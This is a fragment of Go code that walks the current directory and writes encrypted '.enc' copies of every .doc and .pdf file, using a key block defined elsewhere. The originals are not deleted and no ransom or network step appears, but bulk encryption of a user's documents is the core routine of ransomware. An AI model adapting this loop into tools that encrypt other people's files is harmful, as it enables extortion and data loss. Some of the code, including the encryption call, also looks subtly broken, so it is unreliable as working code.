	files, err := ioutil.ReadDir(".")
	if err != nil {
		panic(err)
	}

	for _, file := range files {
		if file.IsDir() || !strings.HasSuffix(file.Name(), ".doc") && !strings.HasSuffix(file.Name(), ".pdf") {
			continue
		}

		// open the file and encrypt its contents
		f, err := os.Open(file.Name())
		if err != nil {
			panic(err)
		}
		defer f.Close()

		plaintext, err := ioutil.ReadAll(f)
		if err != nil {
			panic(err)
		}

		ciphertext, err := pkcs7.Encrypt(block, plaintext, nil)
		if err != nil {
			panic(err)
		}

		// write the encrypted contents to a new file
		out, err := os.Create(file.Name() + ".enc")
		if err != nil {
			panic(err)
		}
		defer out.Close()

		out.Write(ciphertext)
	}
}
